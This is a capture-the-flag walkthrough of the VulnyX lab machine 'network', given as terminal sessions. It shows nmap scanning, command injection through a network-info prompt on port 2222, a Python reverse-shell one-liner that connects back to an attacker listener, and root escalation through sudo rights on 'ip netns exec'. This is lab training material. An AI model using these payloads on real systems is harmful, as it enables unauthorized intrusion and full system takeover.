author: d4t4s3c
difficulty: low
name: network
platform: vulnyx

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vulnyx]
└─$ nmap -sn 192.168.100.0/24           
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-08 13:32 +0700
Nmap scan report for 192.168.100.1 (192.168.100.1)
Host is up (0.00052s latency).
Nmap scan report for 192.168.100.2 (192.168.100.2)
Host is up (0.00086s latency).
Nmap scan report for 192.168.100.214 (192.168.100.214)
Host is up (0.0027s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 4.03 seconds
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vulnyx]
└─$ nmap -sC -sV -p- -T4 192.168.100.214
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-08 13:34 +0700
Nmap scan report for 192.168.100.214 (192.168.100.214)
Host is up (0.0032s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 8.4p1 Debian 5+deb11u7 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp   open  http          Apache httpd 2.4.67 ((Debian))
|_http-server-header: Apache/2.4.67 (Debian)
|_http-title: Apache2 Debian Default Page: It works
2222/tcp open  EtherNetIP-1?
| fingerprint-strings: 
|   GenericLines: 
|     [93m[i] 
|     [97mEnter an IPv4 address to retrieve network information (e.g. 10.10.10.10):
|     [92m 
|     [94m[*] 
|     [97mRetrieving network information for: 
|     [92m
|     [92m
|     [91m
|     INVALID ADDRESS: 
|     [92m
|     [92m[+] 
|     [97mNetwork information retrieved successfully.
|   NULL: 
|     [93m[i] 
|     [97mEnter an IPv4 address to retrieve network information (e.g. 10.10.10.10):
|_    [92m
8080/tcp open  http          Apache httpd 2.4.67 ((Debian))
|_http-server-header: Apache/2.4.67 (Debian)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache2 Debian Default Page: It works
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port2222-TCP:V=7.99%I=7%D=8/8%Time=6A76CE18%P=x86_64-pc-linux-gnu%r(NUL
SF:L,5E,"\n\x1b\[93m\[i\]\x20\x1b\[97mEnter\x20an\x20IPv4\x20address\x20to
SF:\x20retrieve\x20network\x20information\x20\(e\.g\.\x2010\.10\.10\.10\):
SF:\x1b\[92m\x20")%r(GenericLines,327,"\n\x1b\[93m\[i\]\x20\x1b\[97mEnter\
SF:x20an\x20IPv4\x20address\x20to\x20retrieve\x20network\x20information\x2
SF:0\(e\.g\.\x2010\.10\.10\.10\):\x1b\[92m\x20\x1b\[94m\[\*\]\x20\x1b\[97m
SF:Retrieving\x20network\x20information\x20for:\x20\x1b\[92m\r\.\.\.\x1b\[
SF:0m\n\x1b\[92m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x
SF:80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\
SF:x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94
SF:\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x9
SF:4\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x
SF:94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\
SF:x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2
SF:\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe
SF:2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\x
SF:e2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\
SF:xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80
SF:\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x8
SF:0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x
SF:80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\
SF:x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94
SF:\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\x1b\[91m\nINVALID\x20ADDRESS:\
SF:x20\r\n\n\x1b\[92m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\
SF:x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2
SF:\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe
SF:2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\x
SF:e2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\
SF:xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80
SF:\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x8
SF:0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x
SF:80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\
SF:x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94
SF:\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x9
SF:4\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x
SF:94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\
SF:x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2
SF:\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe
SF:2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\x1b\[0m\n\x1b\[92m\[\+\]\
SF:x20\x1b\[97mNetwork\x20information\x20retrieved\x20successfully\.\x1b\[
SF:0m\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.99 seconds
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vulnyx]
└─$ nc 192.168.100.214 2222

[i] Enter an IPv4 address to retrieve network information (e.g. 10.10.10.10): 8.8.8.8 ; id
[*] Retrieving network information for: 8.8.8.8 ; id...
───────────────────────────────────────────────────────────────────────────────────────────
Address:   8.8.8.8              00001000.00001000.00001000. 00001000
Netmask:   255.255.255.0 = 24   11111111.11111111.11111111. 00000000
Wildcard:  0.0.0.255            00000000.00000000.00000000. 11111111
=>
Network:   8.8.8.0/24           00001000.00001000.00001000. 00000000
HostMin:   8.8.8.1              00001000.00001000.00001000. 00000001
HostMax:   8.8.8.254            00001000.00001000.00001000. 11111110
Broadcast: 8.8.8.255            00001000.00001000.00001000. 11111111
Hosts/Net: 254                   Class A

uid=1000(net) gid=1000(net) grupos=1000(net)
───────────────────────────────────────────────────────────────────────────────────────────
[+] Network information retrieved successfully.
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vulnyx]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vulnyx]
└─$ nc 192.168.100.214 2222

[i] Enter an IPv4 address to retrieve network information (e.g. 10.10.10.10): ;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.100.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
[*] Retrieving network information for: ;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.100.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'...
───────────────────────────────────────────────────────────────────────────────────────────
```

```bash
connect to [172.20.131.21] from (UNKNOWN) [172.20.128.1] 61891
net@network:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
net@network:~$ ^Z
zsh: suspended  nc -lvnp 4444
                                                                                         
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vulnyx]
└─$ stty raw -echo; fg                   
[1]  + continued  nc -lvnp 4444

net@network:~$ export TERM=xterm
net@network:~$ export SHELL=/bin/bash
net@network:~$ stty rows 80 cols 150
```

```bash
net@network:~$ id
uid=1000(net) gid=1000(net) grupos=1000(net)
net@network:~$ cat user.txt 
[REDACTED]
```

```bash
net@network:~$ sudo -u root /usr/bin/ip netns add how
net@network:~$ sudo -u root /usr/bin/ip netns exec how /bin/bash
root@network:/home/net# cd
root@network:~# id;whoami;hostname;pwd
uid=0(root) gid=0(root) grupos=0(root)
root
network
/root
root@network:~# cat root.txt 
[REDACTED]
```